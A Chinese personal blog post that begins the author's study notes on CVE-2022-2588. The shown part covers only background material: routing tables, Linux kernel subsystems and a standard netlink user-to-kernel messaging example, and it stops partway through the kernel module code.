<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="cve-2022-2588学习感觉好牛，看描述是一个exp可以完成多个版本的通杀，因为在exp中并没有使用某一个特定的内核地址，所以就是说这个exp没有地址依赖，没有地址依赖那就没有内核版本限制了。最主要还是想学习一下这个漏洞利用才想着学习这个cve的，但是一看exp人傻了，七八百行，再加上网上的资料很少。。。彳亍。。。一周半起步了。 前置知识浅学内核路由表不只是路由器需要路由表，主机自己也得有路">
<meta property="og:type" content="article">
<meta property="og:title" content="cve-2022-2588">
<meta property="og:url" content="http://example.com/2023/02/08/cve-2022-2588/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="cve-2022-2588学习感觉好牛，看描述是一个exp可以完成多个版本的通杀，因为在exp中并没有使用某一个特定的内核地址，所以就是说这个exp没有地址依赖，没有地址依赖那就没有内核版本限制了。最主要还是想学习一下这个漏洞利用才想着学习这个cve的，但是一看exp人傻了，七八百行，再加上网上的资料很少。。。彳亍。。。一周半起步了。 前置知识浅学内核路由表不只是路由器需要路由表，主机自己也得有路">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sslstatic.ktanx.com/images/release/201507/vCXhMhdY8blZcpZS.png">
<meta property="og:image" content="https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/b219ebc4b74543a9432ff93319178a82b901141c.jpg">
<meta property="og:image" content="https://sslstatic.ktanx.com/images/release/201507/k5OzlWd2Xaj4tCLd.png">
<meta property="og:image" content="https://sslstatic.ktanx.com/images/release/201507/X0r753n1J4IOqyUk.png">
<meta property="og:image" content="https://e-mailky.github.io/images/kernel/23069658_1352297109ObJt.jpg">
<meta property="og:image" content="http://just4coding.com/images/2022-08-05/1.png">
<meta property="og:image" content="https://e-mailky.github.io/images/kernel/23069658_1352297396Tqc4.jpg">
<meta property="og:image" content="c:/Users/张鹏/AppData/Roaming/Typora/typora-user-images/image-20221201205500293.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/a2523bab1dc14ef6815c3dffd48f9c30.png#pic_center">
<meta property="og:image" content="https://pic4.zhimg.com/80/v2-69fe299aa60f25a13d7977bf3bbc8763_720w.webp">
<meta property="og:image" content="https://img-blog.csdnimg.cn/e177f920084e4a77b2d4efaad6ee5614.png#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/8baa8820341340a18143b5ed2731daa8.png#pic_center">
<meta property="og:image" content="c:/Users/张鹏/AppData/Roaming/Typora/typora-user-images/image-20221207011459177.png">
<meta property="og:image" content="c:/Users/张鹏/AppData/Roaming/Typora/typora-user-images/image-20221207011836162.png">
<meta property="article:published_time" content="2023-02-08T10:57:09.000Z">
<meta property="article:modified_time" content="2023-02-08T12:41:25.675Z">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sslstatic.ktanx.com/images/release/201507/vCXhMhdY8blZcpZS.png">

<link rel="canonical" href="http://example.com/2023/02/08/cve-2022-2588/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>cve-2022-2588 | study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/08/cve-2022-2588/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          cve-2022-2588
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-02-08 18:57:09 / 修改时间：20:41:25" itemprop="dateCreated datePublished" datetime="2023-02-08T18:57:09+08:00">2023-02-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="cve-2022-2588学习"><a href="#cve-2022-2588学习" class="headerlink" title="cve-2022-2588学习"></a>cve-2022-2588学习</h1><p>感觉好牛，看描述是一个exp可以完成多个版本的通杀，因为在exp中并没有使用某一个特定的内核地址，所以就是说这个exp没有地址依赖，没有地址依赖那就没有内核版本限制了。最主要还是想学习一下这个漏洞利用才想着学习这个cve的，但是一看exp人傻了，七八百行，再加上网上的资料很少。。。彳亍。。。一周半起步了。</p>
<h2 id="前置知识浅学"><a href="#前置知识浅学" class="headerlink" title="前置知识浅学"></a>前置知识浅学</h2><h3 id="内核路由表"><a href="#内核路由表" class="headerlink" title="内核路由表"></a>内核路由表</h3><p>不只是路由器需要路由表，主机自己也得有路由表，路由表的作用其实就类似于导航的作用，它告诉主机数据包应该转发到哪里。如果主机不含路由表，那么它所有的数据包都传送不出去。所以不关事路由器，主机也会有自己的路由表。</p>
<p>可以通过<code>route -n</code>来查看主机的路由表,下面是我虚拟机的路由表。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">内核 IP 路由表</span><br><span class="line">目标            网关            子网掩码        标志  跃点   引用  使用 接口</span><br><span class="line">0.0.0.0         192.168.11.2    0.0.0.0         UG    100    0        0 ens33</span><br><span class="line">169.254.0.0     0.0.0.0         255.255.0.0     U     1000   0        0 ens33</span><br><span class="line">172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0</span><br><span class="line">192.168.11.0    0.0.0.0         255.255.255.0   U     100    0        0 ens33</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一条路由信息主要包括以下几点。</p>
<ul>
<li>目的地址</li>
<li>下一跳地址</li>
<li>子网掩码</li>
<li>网卡接口</li>
</ul>
<h3 id="内核子系统"><a href="#内核子系统" class="headerlink" title="内核子系统"></a>内核子系统</h3><p>linux内核主要由以下七个子系统组成，其中最主要的四个子系统是内存管理子系统、进程管理子系统、网络子系统、虚拟文件系统。</p>
<p><img src="https://sslstatic.ktanx.com/images/release/201507/vCXhMhdY8blZcpZS.png" alt="img"></p>
<p>各个模块的大概依赖如下</p>
<p><img src="https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/b219ebc4b74543a9432ff93319178a82b901141c.jpg" alt="image"></p>
<p>稍微对网络子系统和虚拟文件系统做个了解</p>
<p><strong>网络子系统</strong></p>
<p>Linux网络子系统提供了对各种网络标准的存取和各种硬件的支持。下图是其整体结构。其可以分为协议层和网络驱动程序，其中网络协议主要负责实现每一种可能的网络传输协议，而网络驱动程序负责与硬件通信。</p>
<p><img src="https://sslstatic.ktanx.com/images/release/201507/k5OzlWd2Xaj4tCLd.png" alt="img"></p>
<p><strong>虚拟文件系统</strong></p>
<p>Linux虚拟文件系统（VFS）隐藏了各种硬件的具体细节，为所有的设备提供了统一的接口，它是对各种文件系统的一个抽象，其实使用超级块super block存放文件系统相关信息，使用索引节点inode存放文件的物理信息，使用目录项dentry存放文件的逻辑信息，其整体架构如下。</p>
<p><img src="https://sslstatic.ktanx.com/images/release/201507/X0r753n1J4IOqyUk.png" alt="img"></p>
<p><strong>子系统之间通信</strong></p>
<p>内核的子系统之间是互相依赖的，当某个子系统状态发生改变的时候，就必须使用一定的机制告知使用其服务的其他子系统，以便其他子系统采取相应的措施，但到底如何利用netlink进行子系统之间的通信还是没有查到，只知道各个子系统会对不同的消息会有不同的处理措施。</p>
<h3 id="netlink"><a href="#netlink" class="headerlink" title="netlink"></a>netlink</h3><p>内核和用户态进程进行双向通信的一种机制，非常强大，不仅可以支持内核子系统和用户态进程的通信，还可以进行内核中不同子系统之间的通信，但是我在谷歌或者百度中并没有找到相关机制说明和代码演示，只有内核和用户态进程之间通信的代码实践。</p>
<p>创建socket套接字的时候的结构体，和用户态socket的<code>sockaddr_in</code>结构体功能类似。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">sa_family_t</span>    nl_family;    <span class="comment">/*该字段总是为AF_NETLINK    */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span>    nl_pad;        <span class="comment">/* 目前未用到，填充为0*/</span></span><br><span class="line">    __u32        nl_pid;        <span class="comment">/* process pid    */</span></span><br><span class="line">    __u32        nl_groups;    <span class="comment">/* multicast groups mask */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中<code>nl_pid</code>字段比较重要，当有多个用户态进程连接内核时，内核通过这个字段区分不同进程，一般使用<code>getpid()</code>赋值。</p>
<p>netlink消息体如下</p>
<p><img src="https://e-mailky.github.io/images/kernel/23069658_1352297109ObJt.jpg" alt="T3"></p>
<p>消息头结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32        nlmsg_len;    <span class="comment">/* Length of message including header */</span></span><br><span class="line">    __u16        nlmsg_type;    <span class="comment">/* Message content */</span></span><br><span class="line">    __u16        nlmsg_flags;    <span class="comment">/* Additional flags */</span></span><br><span class="line">    __u32        nlmsg_seq;    <span class="comment">/* Sequence number */</span></span><br><span class="line">    __u32        nlmsg_pid;    <span class="comment">/* Sending process PID */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="用户态和内核态双向通信代码示例"><a href="#用户态和内核态双向通信代码示例" class="headerlink" title="用户态和内核态双向通信代码示例"></a>用户态和内核态双向通信代码示例</h4><p>这份代码是基于内核2.x的，不知道如今内核版本是否能用，并未做过实验，仅做记录学习使用。</p>
<p>用户态</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PAYLOAD 1024 <span class="comment">/*消息最大负载为1024字节*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">dest_addr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>;</span></span><br><span class="line">    <span class="keyword">int</span> sock_fd=<span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == (sock_fd=socket(PF_NETLINK, SOCK_RAW,NETLINK_TEST)))&#123;</span><br><span class="line">          perror(<span class="string">&quot;can&#x27;t create netlink socket!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;dest_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest_addr));</span><br><span class="line">    dest_addr.nl_family = AF_NETLINK;</span><br><span class="line">    dest_addr.nl_pid = <span class="number">0</span>; <span class="comment">/*我们的消息是发给内核的*/</span></span><br><span class="line">    dest_addr.nl_groups = <span class="number">0</span>; <span class="comment">/*在本示例中不存在使用该值的情况*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == bind(sock_fd, (struct sockaddr*)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr)))&#123;</span><br><span class="line">          perror(<span class="string">&quot;can&#x27;t bind sockfd with sockaddr_nl!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span> == (nlh=(struct nlmsghdr *)<span class="built_in">malloc</span>(NLMSG_SPACE(MAX_PAYLOAD))))&#123;</span><br><span class="line">          perror(<span class="string">&quot;alloc mem failed!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(nlh,<span class="number">0</span>,MAX_PAYLOAD);</span><br><span class="line">    <span class="comment">/* 填充Netlink消息头部 */</span></span><br><span class="line">    nlh-&gt;nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);</span><br><span class="line">    `nlh-&gt;nlmsg_pid = getpid();<span class="comment">//我们希望得到内核回应，所以得告诉内核我们ID号`</span></span><br><span class="line">    nlh-&gt;nlmsg_type = NLMSG_NOOP; <span class="comment">//指明我们的Netlink是消息负载是一条空消息</span></span><br><span class="line">    nlh-&gt;nlmsg_flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*设置Netlink的消息内容，来自我们命令行输入的第一个参数*/</span></span><br><span class="line">    <span class="built_in">strcpy</span>(NLMSG_DATA(nlh), argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*这个是模板，暂时不用纠结为什么要这样用。*/</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;iov, <span class="number">0</span>, <span class="keyword">sizeof</span>(iov));</span><br><span class="line">    iov.iov_base = (<span class="keyword">void</span> *)nlh;</span><br><span class="line">    iov.iov_len = nlh-&gt;nlmsg_len;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    msg.msg_iov = &amp;iov;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    sendmsg(sock_fd, &amp;msg, <span class="number">0</span>); <span class="comment">//通过Netlink socket向内核发送消息</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收内核消息的消息</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;waiting message from kernel!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)NLMSG_DATA(nlh),<span class="number">0</span>,<span class="number">1024</span>);</span><br><span class="line">    recvmsg(sock_fd,&amp;msg,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got response: %s\n&quot;</span>,NLMSG_DATA(nlh));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 关闭netlink套接字 */</span></span><br><span class="line">    close(sock_fd);</span><br><span class="line">    <span class="built_in">free</span>(nlh);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内核态</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/skbuff.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/sock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/netlink.h&gt;</span> <span class="comment">/*该文头文件里包含了linux/netlink.h，因为我们要用到net/netlink.h中的某些API函数，nlmsg_put()*/</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Koorey King&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">nl_sk</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//向用户空间发送消息的接口</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sendnlmsg</span><span class="params">(<span class="keyword">char</span> *message,<span class="keyword">int</span> dstPID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line">    <span class="keyword">int</span> len = NLMSG_SPACE(MAX_MSGSIZE);</span><br><span class="line">    <span class="keyword">int</span> slen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!message || !nl_sk)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为新的 sk_buffer申请空间</span></span><br><span class="line">    skb = alloc_skb(len, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span>(!skb)&#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;my_net_link: alloc_skb Error./n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    slen = <span class="built_in">strlen</span>(message)+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用nlmsg_put()来设置netlink消息头部</span></span><br><span class="line">    nlh = nlmsg_put(skb, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, MAX_MSGSIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置Netlink的控制块</span></span><br><span class="line">    NETLINK_CB(skb).pid = <span class="number">0</span>; <span class="comment">// 消息发送者的id标识，如果是内核发的则置0</span></span><br><span class="line">    NETLINK_CB(skb).dst_group = <span class="number">0</span>; <span class="comment">//如果目的组为内核或某一进程，该字段也置0</span></span><br><span class="line"></span><br><span class="line">    message[slen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(NLMSG_DATA(nlh), message, slen+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过netlink_unicast()将消息发送用户空间由dstPID所指定了进程号的进程</span></span><br><span class="line">    netlink_unicast(nl_sk,skb,dstPID,<span class="number">0</span>);</span><br><span class="line">    printk(<span class="string">&quot;send OK!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nl_data_ready</span> <span class="params">(struct sock *sk, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((skb = skb_dequeue(&amp;sk-&gt;sk_receive_queue)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        nlh = (struct nlmsghdr *)skb-&gt;data;</span><br><span class="line">        printk(<span class="string">&quot;%s: received netlink message payload: %s \n&quot;</span>, __FUNCTION__, (<span class="keyword">char</span>*)NLMSG_DATA(nlh));</span><br><span class="line">        sendnlmsg(<span class="string">&quot;I see you&quot;</span>,nlh-&gt;nlmsg_pid); <span class="comment">//发送者的进程ID我们已经将其存储在了netlink消息头部里的nlmsg_pid字段里，所以这里可以拿来用。</span></span><br><span class="line">        kfree_skb(skb);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;recvied finished!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">myinit_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;my netlink in\n&quot;</span>);</span><br><span class="line">    nl_sk = netlink_kernel_create(NETLINK_TEST,<span class="number">0</span>,nl_data_ready,THIS_MODULE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">mycleanup_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;my netlink 